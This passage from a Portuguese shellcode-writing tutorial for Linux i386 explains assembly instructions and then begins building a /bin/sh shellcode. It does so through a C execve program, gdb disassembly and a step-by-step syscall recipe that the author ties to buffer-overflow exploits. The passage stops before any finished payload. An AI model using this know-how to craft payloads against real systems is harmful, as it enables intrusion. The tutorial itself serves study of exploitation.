+por uma determinada acao.Essas instrucoes sao as responsaveis
+pela execucao de nosso programa, no caso, shellcode.E mais uma vez
+recordando, estaremos trabalhando numa plataforma linux i386, mas com
+sintaxe AT&T.
+
+Abaixo segue a lista:
+
++ 6.1 - Instrucoes de Transferencia
+------------------------------------
+
+Sao as responsaveis por tranferir dados contidos em registradores e etc,
+para determinadas regioes na memoria ou execucao de alguma outra
+instrucao.Sao elas:
+
+* MOV  -> Eh a instrucao responsavel pela transferencia de dados na
+          memoria(movimentacao).Sua sintaxe em AT&T eh bastante simples:
+        
+          MOV origem,destino
+
+          Onde origem pode ser um registrador,uma celula de memoria ou
+          um operando qualquer.Um exemplo seria:
+
+          mov    %esp,%ebp
+
+          O que isso aih em cima faz eh transferir o conteudo de %esp
+          (Stack pointer) para %ebp (Base Pointer).Guarde bem esse
+          exemplo, pois ele serah util para os nossos propositos.
+          Outros exemplos:
+        
+          mov    $0x7, %eax
+          mov    0xfffffff8(%ebp),%eax
+          movl   $0x0,0xfffffffc(%ebp)
+
+          Nesse ultimo exemplo, vemos movl (mov + l), lembrando que esse
+          l significa low(baixo).Trata-se de transferencia para parte
+          baixa do registrador, no caso EBP(%ebp).
+          Outras possiveis insercoes em mov sao: movs,movsb,movsw.
+          Nao entrarei em detalhes sobre elas, olhe os links no final
+          caso necessite.Mas em todo caso, movsb serve para mover 1 byte,
+          enquanto movsw serve para mover uma word.
+
+
+
+* LEA ->  Eh uma instrucao parecida com MOV, soh que jah efetua alguns
+          calculos antes de transferir os dados, esses calculos sao
+          na maioria dos casos, sao calculos de endereco de memoria,
+          como ADDs.Vejamos um exemplo:
+
+          add $0x8,%eax
+          mov %eax,%ebx
+
+          Agora substituindo por lea, ficaria:
+        
+          lea 8(%eax),%ebx
+
+          Isso faz-se com que o tempo gasto na execucao de um programa
+          seja cada vez mais rapido, existe um ganho consideravel no
+          uso desta instrucao, mas em compensacao, requer que os
+          programadores estejam mais atentos ao codigo para saber o que
+          de fato estah sendo feito.Um exemplo simples de LEA como
+          uma simples instrucao de transferencia, seria:
+
+          lea $0x8, %eax
+
+          Isto equivaleria a instrucao MOV, no caso.
+
+
+Eu achei por certo descrever brevemente aqui as intrucoes que servem
+para transferir dados para o Stack, pois ao meu ver, sao instrucoes de
+movimentacao.Vejamos:
+
+
+* PUSH -> Esta instrucao empurra dados sobre o Stack(pilha).Vai ser
+          muito usada em nossos exemplos.Vejamos sua sintaxe nesse
+          exemplo:
+
+          push $0x0
+
+          No exemplo acima, a instrucao push empurrou o numero
+          hexadecimal(0) para o stack.Esse numero eh um argumento
+          de uma funcao em C, que veremos mais tarde.
+
+          lea    0xfffffff8(%ebp),%eax
+          push   %eax
+
+          Jah nesse exemplo acima, vemos puss empurrar o endereco de
+          uma funcao propriamente dita.
+
+* POP ->  Eh a instrucao contraria a PUSH, como push empurra dados
+          sobre o Stack, essa instrucao eh usada para retirar dados
+          do Stack, lembre-se que o esquema no Stack eh LIFO - ultimo
+          a entrar, primeiro a sair.Sabendo disso, entao a instrucao
+          POP, irah sempre retirar o ultimo dado inserido no Stack.
+          Vejamos um exemplo:
+
+          mov    %eax,%edx
+          push   %edx
+          call   0x8050b28 <__normal_errno_location>
+          pop    %edx
+
+          Esqueca por enquanto a instrucao call, se atenha somente a
+          push e pop.PUSH empurrou os dados de %edx sobre o Stack, depois
+          POP foi usada para retirar esses dados do Stack.
+
+        
+Existem bem mais instrucoes de transferencia, mas como dito, isto nao
+eh um tutorial sobre programacao em assembly.Se quiser, ou necessitar,
+procure internet a fora, vah nos links que divulgo abaixo.
+
++ 6.2 - Instrucoes Aritmeticas
+-------------------------------
+
+Sao as intrucoes usadas para relizacao de calculos(operacoes
+aritmeticas) nos operadores. Sao elas:
+
+* ADD -> Faz a adicao de dois operadores.Esta instrucao adiciona
+         dois operadores e guarda o resultado no operador destino.
+         Sua sintaxe em AT&T eh a seguinte:
+
+         add origem, destino
+
+         Onde origem pode ser uma regiao na memoria ou um dado numero
+         hexa.Vejamos um exemplo:
+
+         add    0xc,%eax
+
+* MUL -> Faz a multiplicacao de dois operadores.Sua sintaxe em AT&T eh:
+
+         mul $0x4,%ax
+
+         Teremos ainda a instrucao IMUL, que tambem serve para
+         multiplicacao de operando, soh que essa instrucao leva em
+         consideracao o sinal do operando, enquanto MUL nao considera.
+        
+* DIV -> Obviamente, serve para fazer divisao de dois operadores.
+
+         div $0x4,%eax
+        
+         Assim como na instrucao acima para multiplicacao de operandos,
+         a instrucao DIV tem sua instrucao paralela, responsavel por
+         divisao de operandos levando em consideracao o sinal, essa
+         instrucao eh a IDIV.
+
+* SUB -> Aqui vai uma explicacao um pouco mais detalhada.Sub eh usada
+         para fazer subtracao de operadores, e tambem para alocar
+         espacos para receber dados no Stack, que nos interessa.
+         Quando formos criar nosso shellcode, veremos sub resevar espaco
+         no stack para receber dados que nos impurraremos.Ex:
+
+         sub    $0x8,%esp
+        
+         Isto faz com que seja reservado 8 bytes no Stack para receber
+         dados.
+
+* INC -> Eh o incrementador na linguagem assembly.Assim como nas outras
+         linguagens, ele incrementa um operando, sendo que aqui, como eh
+         muita logica, ele jah trabalha em cima dos dados recebidos.
+         Vejamos um exemplo do uso de inc:
+
+         movl %ebx, %eax
+         inc %eax
+
+         Nesse exemplo acima, ele incrementou normalmente, somando 1
+         ao dado contido em %ebx.Com um pouco de neuronio, isto pode
+         ser usado da mesma forma para manipular enderecos de
+         memoria(como incrementar ponteiros em C).
+
+* DEC -> Decrementador.Serve para decrementar um determinado operando.
+         Faz o contrario da instrucao acima.Da mesma forma, essa intrucao
+         pode ser usada para se manipular enderecos da memoria.
+
+
+
++ 6.3 - Instrucoes de Comparacao
+---------------------------------
+
+Sao instrucoes responsaveis por comparar operandos.Sao elas:
+
+* CMP -> Compara dados em operandos.Exemplo:
+
+         cmp $0x8, %eax
+
+         Existem outras instrucoes parecidas com CMP, como CMPSB e
+         CMPSW, a primeira usada para comparar um byte, a segunda
+         uma word.
+
+* TEST -> Essa instrucao eh usada em comparacoes logicas.
+
+         test   %edx,%edx
+        
+         Faz uma checagem num determinado registrador para ver se
+         estah tudo certo.
+
+
++ 6.4 - Instrucoes de Salto
+----------------------------
+
+Essas instrucoes sao usadas para alterar a direcao normal de um programa.
+O pessoal que jah mecheu com programacao nao-estruturada, acho que nem
+precisa perder tempo com isso aqui, vou descrever de forma breve o que
+sao e representam essas instrucoes.
+As instrucoes de salto sao usadas pelo programa para fazer com que
+uma determinada rotina execute antes de outra ou mesmo, em rotinas
+condicionais, vejamos um esquema:
+
+Se A = B, pula para Z.
+senao continua normalmente.
+
+No exemplo de "algoritmo" acima, vemos um salto condicional, se a
+condicao for verdadeira, ocorre o salto(Primeira linha),senao, nao
+ocorre o salto.
+
+Mas existem situacoes, e em nossos exemplos as teremos, em que o
+salto nao eh condicional.Quem mecheu com Basic,com a instrucao goto,
+sabe do que estou falando.Os saltos incondicionais servem para fazer
+com que a direcao normal do programa seja alterada.Essa instrucao,
+geralmente faz com que o programa fique indo e voltando, ou pulando
+para uma determinada execucao depois para outra, nada estruturado.
+Uma razao de ter se criado algoritmos de dados estruturados eh justamente
+essa, quando se tem saltos condicionais ou nao, o algoritmo fica meio
+baguncado, dificultando a leitura e compreensao por parte de outros
+programadores que nao fizeram o dito cujo.Mas a realidade eh que, pelo
+menos para mim, que mechi com essas linguagens "antigas", instrucoes
+como goto, bem como esquemas de saltos, facilitavam e muito as coisas.
+Agora quando me deparo com problemas deste tipo, agradeco a Deus por
+ter mechido com aquilo!!:)..E olha que falam hoje em dia em banir
+esquemas de algoritmos nao-estruturados!!!Querem mesmo alienar o pessoal!!
+
+De qualquer forma, essas instrucoes relacionam ao fluido(direcao) normal
+da execucao de um programa.O esquema abaixo irah demonstrar um salto
+incondicional.Farei ele em QBASIC..:)..bateu uma saudade agora!!:)
+
+1 CLS
+2 COLOR 15
+3 PRINT "Seja bem vindo"
+4 INPUT "Digite sua senha: ", senha$
+5 IF senha$ = "fucador" THEN GOTO 20:  ELSE GOTO 10
+6 PRINT "Voce estah testando um salto condicional!!"
+10 PRINT "Voce nao eh bem vindo aqui"
+11 GOTO 4
+20 PRINT "seja bem vindo fucador!!"
+21 PRINT "Aqui eh a sua casa!!"
+
+
+Se voce prestar atencao a esse programa, verah os saltos sendo
+praticados, na linha 4 recebe-se uma variavel senha$, na linha
+5, faz-se uma comparacao usando if(se), se senha$ eh igual a
+fucador, pule para a linha 20, esta linha 20 irah imprimir uma
+mensagem de boas vindas, mas se a senha$ nao for igual a fucador,
+nos vimos na linha 5, ELSE GOTO 10, se nao for pule para 10,
+pularemos para a linha 10, aqui na linha 10, nos temos uma
+mensagem dizendo que fulano nao eh bem vindo, em seguida na linha
+11 temos a execucao do que chamamos de salto incondicional.Na
+linha 11, ordenamos um salto para a linha 4, gerando um looping,
+caso ele sempre digite a senha errada.Bem, aih estah um exemplo
+em QBASIC, o pessoal velha guarda deve ter pulado isso tudo jah,
+mas para o pessoal que nao conhece BASIC, e nem usa MS-DOS,
+windows nao tem QBASIC nele, nem nenhuma outra linguagem.O
+MS-DOS trazia QBASIC, um debugador capaz de gerar arquivos
+.COM com codigos assembly,e outras coisas, ateh um anti-virus.
+Mas como as coisas mudam, deixa pra lah.Para o pessoal que nao
+tem QBASIC, aih vai um exemplo desses saltos em C.
+
+/* Programa exemplo de saltos em C */
+
+#include <stdio.h>
+#include <stdlib.h>
+
+main(){
+char senha[30];
+printf("Digite a senha: ");
+scanf("%s",&senha);
+if(!strcmp(senha,"fucador")) goto BEM_VINDO;
+else goto FORA_DAQUI;
+
+BEM_VINDO:
+printf("Seja bem vindo fucador!!\n");
+goto FUCADOR;
+
+FORA_DAQUI:
+printf("Voce nao eh bem vindo!!!\n");
+printf("Saia fora daqui!!\n");
+return 0;
+
+FUCADOR:
+printf("Eis aqui a complementacao do salto incondicional!!\n");
+return 0;
+}
+
+Analisando bem o programa acima, voce verah o uso de goto para
+salto condicional(salta para BEM_VINDO e para FORA_DAQUI), e tambem
+o uso de goto para um salto incondicional , que eh a chamada goto
+dentro de BEM_VINDO, vemos goto FUCADOR.
+Caras que manjam muito de algoritmos fogem destas instrucoes e destes
+saltos, em C, geralmente se procura colocar tudo em funcoes,mas para
+nosso intuito de execucao de shellcodes, faz-se necessario este
+conhecimento, haja visto, muitos usarao estes shellcodes em exploits
+para buffer overflows, se para automatizar o processo, faz-se
+necessarios alguns saltos.
+
+Bem amigos, podemos ver na pratica o que sao estes saltos, que faz
+com que o programa pule de lah para cah.Veremos agora algumas instrucoes
+em assembly responsaveis por fazerem saltos parecidos com os citados
+acima.Sao elas:
+
+
+* JMP -> Eh o tal do jump(pula,salta).Eh muito usada em saltos
+         incondicionais, fazendo o programa ir executar alguma instrucao
+         diretamente, antes de poder seguir em frente, na sua direcao
+         normal.Vejamos um exemplo:
+
+         jmp 0xd
+         mov 0x0, %eax
+        
+         No exemplo acima,vimos jmp ordenar ao programa que salte para a
+         posicao 0xd, executando a instrucao que deverah estar incluida
+         nesta posicao, a instrucao mov, abaixo, assim como nos exemplos
+         que vimos acima, nao serah executada, a nao ser que exista uma
+         outra chamada de jmp para a posicao de memoria onde se encontra
+         esta instrucao.
+
+Existem varias instrucoes que equivalem a JMP, mas que servem executam
+somente saltos condicionais, eis algumas delas aqui:
+
+* JAE -> Jump if Above or Equal.Ela salta se o parametro for acima
+         ou igual ao dados.
+
+* JNE -> Jump if Not Equal.Salta se paramentro nao for igual.
+
+* JGE -> Jump if Greater than or Equal.Salta se for maior ou igual a.
+
+* JLE -> Jump if Less or Equal .Salta se for menor ou igual a.
+
+* JE  -> Jump if Equal.Salta parametro for igual a.
+
+* JB  -> Jump if Below.Salta se abaixo.
+
+* JG  -> Jump if Greater than. Salta se for maior que.
+
+* JL  -> Jump if Less than. Salta se for menor que.
+
+Cada instrucao desta citada acima possui como parametro uma posicao de
+memoria, vemos um exemplo, na linha abaixo:
+
+je     0x8048304
+
+Existem ainda varias outras, mas fogem do objetivo deste tutorial,como
+dito varias vezes, pesquise mais sobre assembly internet a fora.
+
+
+* CALL -> A instrucao call, eh  usada para chamar um sub-rotina, ou
+          mesmo para gerar uma especie de salto para uma instrucao no
+          programa.Como vamos trabalhar em cima de um codigo C debugado,
+          veremos essa instrucao constantemente chamar um system call.
+          Um exemplo de seu uso, seria:
+
+          call   0x80
+        
+          Faz o programa "saltar" para o codigo que se encontra neste
+          endereco(0x80).Num programa C debugado, podemos ver a instrucao
+          CALL chamar um system call:
+
+          call   0x80483fc <execve>
+
+          No exemplo acima, call chama o sys_call execve.
+
+        
+Existe ainda outra instrucao que eh considerada como sendode salto,
+seria a instrucao LOOP, mas nao a descreverei nesse tutorial.
+
+
++ 6.5 Instrucoes Logicas
+-------------------------
+
+Sao instrucoes que o proprio nome jah denuncia, logicas!!Elas servem
+para fazer operacoes logicas! Conhecemos elas em quase todas as
+linguagens que se prezem!Veremos uma comparacao das insrucoes logicas
+assembly com as do C.Vejamos:
+
+     C       Equivalente em     ASM
+ --------  ----------------- --------
+
+     &                          AND
+     |                           OR
+     ~                          NOT
+     ^                          XOR
+
+Nao vou colocar aqui a tabela verdade, olhe em qualquer tutorial de
+programacao, pois quando a coisa eh logica, eh logica para todos!!:)
+Vejamos agora a sintaxe para cade instrucao logica:
+
+* AND -> Eh o "e" logico.Sua sintaxe segue no exemplo abaixo:
+
+         and $0xfff,%eax
+
+* OR  -> Eh o "ou" logico.
+
+         or $0xfff,%eax
+
+* NOT -> Eh o "nao" logico.Eh usado para inverter os bits de um byte ou
+         uma word.
+        
+         not %edx
+
+* XOR -> Conhecido como "OR" exclusivo.XOR funciona da mesma forma que OR,
+         soh que usado exclusivamente,se apenas uma variavel tiver
+         resultado esperado.Ele eh muito usado para inverter um determinado
+         bit de um byte ou um word, sem afetar os outros bits.
+
+         xor %edx
+
+Caso tenha duvidas sobre isso, pesquise nos links mano, tem coisas boas
+lah!
+
+--------------
+7 - SHELLCODE |
+--------------
+
+Bem, chegamos entao a parte que de fato nos interessa.Escrever shellcodes
+nao eh considerado coisa facil.Um conhecimento basico de assembly se faz
+mais do que necessario, uma vez que coloquei esses dados aih em cima,
+isso nao quer dizer de modo algum que voce estah apto para sair dizendo
+por aih que manja de assembly.Meu intuito nao eh e nunca serah de tornar
+alguem expert nesse quesito.Se quiser, creio que irah querer ou ateh mesmo
+irah necessitar, corra atras de mais informacoes sobre isso. Na parte de
+links voce poderah encontrar mais textos que o ajudarao a aprender essa
+fascinante e dificil linguagem.
+Partindo do pre-suposto que voce sabe programar o basico em ASM e C,pois
+nossos shellcodes serao para exploits em C, iremos agora dar inicio a
+esse emocionante aprendizado.
+
+Como vimos lah em cima o modelo usual de memoria nos possibilita
+colocar e armazenar dados numa regiao de memoria conhecida como Stack
+ou pilha.Uma vez que podemos colocar dados, usaremos nossos neuronios
+para atingir nossos objetivos, a execucao de codigos via instrucoes asm
+no Stack.Nao entrarei em detalhes sobre codigo arbitrario pelo buffer,
+ou mais conhecido como buffer overflow, irei explicar a escrita basica
+de shellcodes, mas voce terah que pensar em teus esquemas,soh recapitulo
+que antes de um programa ser executado o FRAME POINTER(EBP) eh salvo,em
+seguida faz do atual STACK POINTER o novo frame pointer, isso eh o que
+costumamos chamar de procedimento inicial ou preludio,isso servirah mais
+a frente para intuitos de overflow.
+Mais abaixo descreverei possiveis esquemas de uso para isso tudo.
+
+Bem, para comecarmos, iremos trabalhar em cima do shellcode mais
+conhecido na atualidade, o codigo de execucao de /bin/sh.Vejamos:
+
+7.1 - SHELLCODE /BIN/SH
+------------------------
+
+Este shellcode eh bastante difundido, e voce pode ver em varios txts
+como ele eh escrito, mas creio que nao tao de forma detalhada quanto
+neste, de qualquer forma, este shellcode eh bastante util, principalmente
+em situacoes de buffer overflows.O seu codigo-fonte mais simples em C
+eh o seguinte:
+
+/* Futuro shellcode /bin/sh */
+
+#include <stdio.h>
+main(){
+char *comando[2];
+comando[0]="/bin/sh";
+comando[1]=NULL;
+execve(comando[0],comando,NULL);
+}
+
+Se voce compilar ele normalmente verah que funciona perfeitamente.
+[localhost:/]$ gcc -o shell shell.c
+[localhost:/]$ ./bin_sh
+$exit
+exit
+
+Agora iremos partir para analisar seu codigo em gdb.Para isso faz-se
+necessario que voce o compile da seguinte forma:
+
+[localhost:/]$gcc -o shell -static -ggdb shell.c
+
+Feito isso amigo, prosseguimos abrindo seu codigo pelo debugador da
+gnu(gdb) da seguinte forma:
+
+[localhost:/]$ gdb shell
+GNU gdb 4.18
+Copyright 1998 Free Software Foundation, Inc.
+GDB is free software, covered by the GNU General Public License, and you
+are welcome to change it and/or distribute copies of it under certain
+conditions. Type "show copying" to see the conditions.
+There is absolutely no warranty for GDB.  Type "show warranty" for details.
+This GDB was configured as "i686-pc-linux-gnulibc1"...
+(gdb)
+
+Em seguida digitamos "disassemble main", para que o gdb nos forneca o
+codigo da funcao main em linguagem assembly.Veremos:
+
+(gdb) disassemble main
+Dump of assembler code for function main:
+0x8048150 <main>:       push   %ebp
+0x8048151 <main+1>:     mov    %esp,%ebp
+0x8048153 <main+3>:     sub    $0x8,%esp
+0x8048156 <main+6>:     movl   $0x8058b28,0xfffffff8(%ebp)
+0x804815d <main+13>:    movl   $0x0,0xfffffffc(%ebp)
+0x8048164 <main+20>:    push   $0x0
+0x8048166 <main+22>:    lea    0xfffffff8(%ebp),%eax
+0x8048169 <main+25>:    push   %eax
+0x804816a <main+26>:    mov    0xfffffff8(%ebp),%eax
+0x804816d <main+29>:    push   %eax
+0x804816e <main+30>:    call   0x80483fc <execve>
+0x8048173 <main+35>:    add    $0xc,%esp
+0x8048176 <main+38>:    mov    %ebp,%esp
+0x8048178 <main+40>:    pop    %ebp
+0x8048179 <main+41>:    ret
+End of assembler dump.
+(gdb)
+
+Bem amigo, vamos com calma, para quem nao tem conhecido basico de assembly
+sem duvida estah voando nas instrucoes acima, mas veremos abaixo,no
+decorrer, o que representa cada instrucao desta aih.Se voce eh fera em
+assembly, vai pulando!
+
+Vamos analisar o que estah sendo feito:
+0x8048150 <main>:       push   %ebp
+0x8048151 <main+1>:     mov    %esp,%ebp
+0x8048153 <main+3>:     sub    $0x8,%esp
+
+Essa tres primeiras linhas correspondem ao processo inicial ou
+procedimento preludio.O que essas linhas fazem eh aquilo que descrevi
+no inicio desse "capitulo" ,o que elas fazem eh: primeiro eh salvar o
+frame pointer antigo, em seguida faz do atual stack pointer o novo frame
+pointer(mov %esp,%ebp), logo apos autoriza espaco para as variaveis
+locais, onde no nosso caso eh:
+
+char *comando[2];
+
+
+Lembrando que ponteiro eh uma word long, entao ele autoriza espaco para
+duas words ou 8 bytes como vimos(sub $0x8,%esp).Continuando:
+
+0x8048156 <main+6>:     movl   $0x8058b28,0xfffffff8(%ebp)
+
+Essa gigantesta linha aih nao tem nada de complexo como parece,o que
+estah sendo feito aih eh a copia do endereco da string "/bin/sh"(valor
+0x8058b28) sobre o primeiro ponteiro de comando[] (0xfffffff8(%ebp)).
+Isto equivale a: comando[0] = "/bin/sh". Continuando:
+
+0x804815d <main+13>:    movl   $0x0,0xfffffffc(%ebp)
+
+O que foi feito agora eh a copia do valor 0x0, que eh equivalente a NULL,
+sobre o segundo ponteiro de comando[].Isto eh equivalente a:
+comando[1] = NULL; em nosso codigo shell.c acima.Continuando:
+
+0x8048164 <main+20>:    push   $0x0
+
+Bem amigos, aqui tem inicio a chamada da funcao execve(), lembrando,
+o programa empurra os argumentos de execve em ordem inversa(do ultimo
+argumento para o primeiro) sobre o stack.Acima vimos que comeca com
+0x0 (NULL).Em nosso fonte shell.c temos: execve(comando[0],comando,NULL);
+Eh a este NULL que estamos nos referindo.Continuando:
+
+0x8048166 <main+22>:    lea    0xfffffff8(%ebp),%eax
+
+Aqui ocorre o carregamento do endereco de comando[] sobre o registrador
+EAX.Continuando:
+
+0x8048169 <main+25>:    push   %eax
+
+Esse nao possui segredo, o que ocorreu foi que empurramos o endereco
+de comando[] que havia sido previamente carregado no registrado EAX
+sobre o Stack. Continuando:
+
+0x804816a <main+26>:    mov    0xfffffff8(%ebp),%eax
+
+Aqui, carregamos o endereco da string "/bin/sh" sobre o registrador
+EAX.Continuando:
+
+0x804816d <main+29>:    push   %eax
+
+Novamente a funcao push(), que nos diz dessa vez que estamos empurrando
+os dados do registrado EAX, que nesse caso eh o endereco da string
+"/bin/sh", sobre o Stack.Continuando:
+
+0x804816e <main+30>:    call   0x80483fc <execve>
+
+Aqui acontece o seguinte, ocorre a chamada a biblioteca de procedimentos
+execve(), ou simplesmente a chamada propriamente dita da funcao execve().
+A instrucao chamada empurra o IP(Index Pointer) sobre o Stack.
+Lembrando que apos a execucao de execve(), nosso programa termina, entao
+as linhas abaixo seguem para voltar as rotinas anteriores:
+
+0x8048173 <main+35>:    add    $0xc,%esp
+
+0x8048176 <main+38>:    mov    %ebp,%esp
+0x8048178 <main+40>:    pop    %ebp
+0x8048179 <main+41>:    ret
+
+Ocorre aih em cima o seguinte, eh o processo de saida, retorna o velho
+frame pointer, faz dele o stual stack pointer em seguida esvazia a pilha
+com pop. e ret retorna p/ o sistema.
+
+Agora analisaremos a funcao execve();
+
+(gdb) disassemble execve
+Dump of assembler code for function execve:
+0x80483fc <execve>:     push   %ebp
+0x80483fd <execve+1>:   mov    %esp,%ebp
+0x80483ff <execve+3>:   push   %ebx
+0x8048400 <execve+4>:   mov    $0xb,%eax
+0x8048405 <execve+9>:   mov    0x8(%ebp),%ebx
+0x8048408 <execve+12>:  mov    0xc(%ebp),%ecx
+0x804840b <execve+15>:  mov    0x10(%ebp),%edx
+0x804840e <execve+18>:  int    $0x80
+0x8048410 <execve+20>:  mov    %eax,%edx
+0x8048412 <execve+22>:  test   %edx,%edx
+0x8048414 <execve+24>:  jge    0x8048426 <execve+42>
+0x8048416 <execve+26>:  neg    %edx
+0x8048418 <execve+28>:  push   %edx
+0x8048419 <execve+29>:  call   0x8050b28 <__normal_errno_location>
+0x804841e <execve+34>:  pop    %edx
+0x804841f <execve+35>:  mov    %edx,(%eax)
+0x8048421 <execve+37>:  mov    $0xffffffff,%eax
+0x8048426 <execve+42>:  pop    %ebx
+0x8048427 <execve+43>:  mov    %ebp,%esp
+0x8048429 <execve+45>:  pop    %ebp
+0x804842a <execve+46>:  ret
+0x804842b <execve+47>:  nop
+End of assembler dump.
+
+
+O codigo parece complicado a primeira vista,muitas instrucoes em assembly,
+nao tao conhecidas p/ um newbie, como neg,test,jne, mas que sao explicadas
+em diversos tutoriais internet a fora.A maioria das coisas voce jah pode
+saber somente olhando e comparando com as explicacoes passadas.
+Mas vejamos:
+
+0x80483fc <execve>:     push   %ebp
+0x80483fd <execve+1>:   mov    %esp,%ebp
+0x80483ff <execve+3>:   push   %ebx
+
+Isso eh o mesmo procedimento inicial descrito na explicacao sobre a
+funcao main().Pega-se o velho frame pointer e salva-o, em seguida faz do
+atual stack pointer o novo frame pointer e depois o empurra no stack.
+Continuando:
+
+0x8048400 <execve+4>:   mov    $0xb,%eax
+Copia 0xb sobre EAX, que eh o numero 11 em decimal.Este numero corresponde
+ao system call execve() na tabela de system calls do sistema.Voce pode
+conferir essa tabela em /usr/include/sys/syscall.h , nao sei se isso
+varia de linux para linux,mas creio que nao.Continuando:
+
+0x8048405 <execve+9>:   mov    0x8(%ebp),%ebx
+
+O que aconteceu acima foi a copia do endereco de "/bin/sh" sobre EBX.
+Continuando:
+
+0x8048408 <execve+12>:  mov    0xc(%ebp),%ecx
+
+Copiamos o endereco de comando[] sobre ECX.
+
+0x804840b <execve+15>:  mov    0x10(%ebp),%edx
+
+Copiamos o endereco do ponteiro nulo (NULL) sobre EDX.
+
+0x804840e <execve+18>:  int    $0x80
+
+Aqui nos mudamos para o modo kernel.
+
+Para o intuito da escrita de shellcodes, isso aqui eh o fim do estudo
+da funcao execve(), esses comandos que seguem abaixo, jah sao mais
+complexos e acredite, creio serem inuteis para os nossos objetivos!!Uma
+vez que se entra no modo kernel, as intrucoes que seguem "nao fazem"
+parte do nosso programa.Se quiser ver como a coisa vai se complicando
+digite na linha de comandos do gdb "disassemble __normal_errno_location"
+e por aih vai.
+
+O estudo detalhado acima nos dah uma boa base para sabermos como
+funciona o processo de execucao de nosso programa shell.c em instrucoes
+de "maquina".
+
+Veremos abaixo alguns passos que nos ajudarao a escrever nosso shellcode.
+Necessitaremos das seguintes coisas p/ podermos escrever nosso shellcode:
+
+1. Termos a string "/bin/sh" terminada nula em algum lugar na memoria.
+   Lembrando que estamos querendo executar esse comando, se fosse outro,
+   logico que poderiamos mudar isso, mas a coisa se complicaria ainda
+   mais.
+
+2. Ter o endereco da string "/bin/sh" em algum lugar na memoria seguido
+   por uma word null long.Por que isso? lembra do esquema:
+   comando[1] = NULL;
+   Se faz necessario isso aqui.
+
+3. Copiar 0xb sobre o registrador EAX.
+   Lembrando que de acordo com a tabela de system calls que podemos achar
+   em /usr/include/sys/syscall.h, o numero decimal correspondente ao
+   syscall execve() eh 11 (0xb).
+
+4. Copiar o endereco da string "/bin/sh" sobre o registrador EBX.
+
+5. Copiar o endereco da string "/bin/sh" sobre o registrador ECX.
+
+6. Copiar o endereco da word null long sobre o registrador EDX.
+
+7. Executar a intrucao int $0x80.
+
+Para facilitar o aprendizado veremos como cada um dos passos citados
+acima, no nosso exemplo inicial de shellcode:
+
+1. 0x8048156 <main+6>:     movl   $0x8058b28,0xfffffff8(%ebp)
+
+2. 0x804815d <main+13>:    movl   $0x0,0xfffffffc(%ebp)
+
+3. 0x8048400 <execve+4>:   mov    $0xb,%eax
+
+4. 0x8048405 <execve+9>:   mov    0x8(%ebp),%ebx
+
+5. 0x8048408 <execve+12>:  mov    0xc(%ebp),%ecx
+
+6. 0x804840b <execve+15>:  mov    0x10(%ebp),%edx
+
+7. 0x804840e <execve+18>:  int    $0x80
+
+O esquema acima eh apenas demonstrativo, ainda faltam alguns passos p/
+seguir na construcao de um shellcode eficiente.Por exemplo,para evitar
+que o programa continue buscando instrucoes para o Stack, caso a funcao
+execve() falhe.Nos precisaremos usar um artificio que faca com que o
+programa saia limpamente, caso haja falha em execve().Sair limpamente
+significa voltar a linha de comando, sem que o programa busque dados
+aleatorios caso execve() falhe.Para fazermos isso basta inserir uma
+chamada normal de saida junto ao nosso shellcode.Fazemos isso da seguinte
+forma:
+
+Pegamos e compilamos o programa abaixo:
+
+------------------------------------------------------------------------
+/* PROGRAMA QUE NOS AJUDARAH A SAIR LIMPAMENTE
+   CASO EXECVE() FALHE
+   Compile com: gcc -o saida -static -ggdb saida.c
+*/
+
+#include <stdio.h>
+
+void main(){
+exit(0);
+}
+-----------------------------------------------------------------------
+
+Compilamos ele entao:
+[localhost:/]$ gcc -o saida -static -ggdb saida.c
+
+Logo apos a compilacao,chamamos nosso bom e velho debugador gdb para
+vermos como isso fica em asm:
+
+[localhost:/]$gdb saida
+GNU gdb 4.18
+Copyright 1998 Free Software Foundation, Inc.
+GDB is free software, covered by the GNU General Public License, and you
+are welcome to change it and/or distribute copies of it under certain
+conditions.Type "show copying" to see the conditions.
+There is absolutely no warranty for GDB.  Type "show warranty" for
+details.This GDB was configured as "i686-pc-linux-gnulibc1"...
+(gdb)
+
+Em seguida digitamos "disassemble _exit" para que o gdb nos forneca o que
+queremos saber.Atencao: digite _exit(com um traco antes, como estah aqui).
+
+(gdb) disassemble _exit
+Dump of assembler code for function _exit:
+0x80483e4 <_exit>:      push   %ebp
+0x80483e5 <_exit+1>:    mov    %esp,%ebp
+0x80483e7 <_exit+3>:    push   %ebx
+0x80483e8 <_exit+4>:    mov    $0x1,%eax
+0x80483ed <_exit+9>:    mov    0x8(%ebp),%ebx
+0x80483f0 <_exit+12>:   int    $0x80
+0x80483f2 <_exit+14>:   mov    0xfffffffc(%ebp),%ebx
+0x80483f5 <_exit+17>:   mov    %ebp,%esp
+0x80483f7 <_exit+19>:   pop    %ebp
+0x80483f8 <_exit+20>:   ret
+0x80483f9 <_exit+21>:   nop
+0x80483fa <_exit+22>:   nop
+0x80483fb <_exit+23>:   nop
+End of assembler dump.
+
+
+Podemos facilmente ver algumas coisas, vamos analisar este codigo.
+
+0x80483e4 <_exit>:      push   %ebp
+0x80483e5 <_exit+1>:    mov    %esp,%ebp
+0x80483e7 <_exit+3>:    push   %ebx
+
+Procedimento inicial, o mesmo esquema descrito para a funcao execve()
+acima.Continuando:
+
+0x80483e8 <_exit+4>:    mov    $0x1,%eax
+
+Aqui ele coloca 0x1 (1 em decimal) no registrado EAX.Esse eh o numero
+correspondente ao system call exit() na tabela de system calls.
+Continuando:
+
+0x80483ed <_exit+9>:    mov    0x8(%ebp),%ebx
+
+Aqui copia o endereco de exit, propriamente dito.Por que isso?? Veremos
+porque logo abaixo.quando virmos algumas linhas de main().
+
+0x80483f0 <_exit+12>:   int    $0x80
+
+Muda para o modo kernel.
+
+Disassemblando main, teremos:
+
+(gdb) disassemble main
+Dump of assembler code for function main:
+0x8048150 <main>:       push   %ebp
+0x8048151 <main+1>:     mov    %esp,%ebp
+0x8048153 <main+3>:     push   $0x0
+0x8048155 <main+5>:     call   0x804829c <exit>
+0x804815a <main+10>:    add    $0x4,%esp
+0x804815d <main+13>:    lea    0x0(%esi),%esi
+0x8048160 <main+16>:    mov    %ebp,%esp
+0x8048162 <main+18>:    pop    %ebp
+0x8048163 <main+19>:    ret
+End of assembler dump.
+
+O que nos interessa para entendermos a linha <_exit+9> do codigo asm
+de exit() eh somente o seguinte:
+
+0x8048153 <main+3>:     push   $0x0
+0x8048155 <main+5>:     call   0x804829c <exit>
+
+Como o Stack pega os argumento de tras para frente, na linha do nosso
+programa saida.c: exit(0), em asm teremos:
+
+push $0x0  -> Empurra 0 sobre o Stack.
+call exit  -> Chama a funcao exit().
+
